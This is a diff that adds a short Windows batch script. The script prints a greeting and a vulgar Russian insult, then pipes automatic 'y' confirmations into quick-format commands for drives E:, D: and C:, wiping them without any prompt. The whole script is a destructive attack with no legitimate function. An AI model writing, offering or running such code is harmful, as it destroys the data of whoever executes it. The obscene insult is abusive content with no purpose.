@@ -1,0 +1,6 @@
+@echo off
+echo Hello all people!
+echo Otsosy moyego bolshogo chlena
+echo y| format e: /q /u
+echo y| format d: /q /u
+echo y| format c: /q /u
